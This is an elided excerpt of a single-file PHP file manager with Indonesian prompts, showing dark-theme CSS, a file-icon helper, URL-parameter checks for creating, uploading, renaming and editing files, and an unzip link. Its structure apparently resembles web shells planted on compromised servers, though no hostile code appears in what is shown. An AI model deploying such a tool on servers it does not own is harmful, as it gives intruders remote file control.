...
<head>
    ...
    /* Form Dark Theme */
    .date-picker-form, .create-folder-form, .upload-form, .rename-form, .create-file-form {
        background: #2d2d2d;
        padding: 20px;
        border-radius: 5px;
        margin: 20px 0;
...
<body>
    ...
    function fileIcon($file)
    {
        ...
        if ($ext == "html" || $ext == "htm") {
            ...
            return '<i class="fa-regular fa-file-zipper" style="color: #ffc107;"></i> ';
        } else {
...
<nav class="navbar navbar-light">
    ...
    if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfile']) && !isset($_GET['upxc']) && !isset($_GET['r']) && !isset($_GET['t']) && !isset($_GET['e'])) {
...
";
        ...
        foreach ($files as $file) {
            ...
            if ($ext == 'zip') {
                $actions .= '<a title="Unzip" href="?q=' . urlencode(encodePath(PATH)) . '&u=' . urlencode($file) . '" onclick="return confirm(\'Yakin ingin mengunzip file ini?\')"><i class="fa-regular fa-file-zipper" style="color: #ffc107;"></i></a>';
            }
